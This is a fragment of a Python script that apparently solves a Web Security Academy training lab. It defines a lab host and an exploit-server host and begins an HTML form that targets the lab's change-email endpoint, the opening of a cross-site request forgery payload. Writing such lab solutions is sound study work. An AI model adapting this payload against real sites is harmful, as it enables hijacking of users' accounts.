...
def main():
    host = "https://0a6200280425c74381bcdebf004e0061.web-security-academy.net"
    exploit_host = "https://exploit-0a0c00a10470c7cc81e6ddf5017c0031.exploit-server.net"
    ...
    <html>
	<body>
		<form  action="{host}/my-account/change-email">
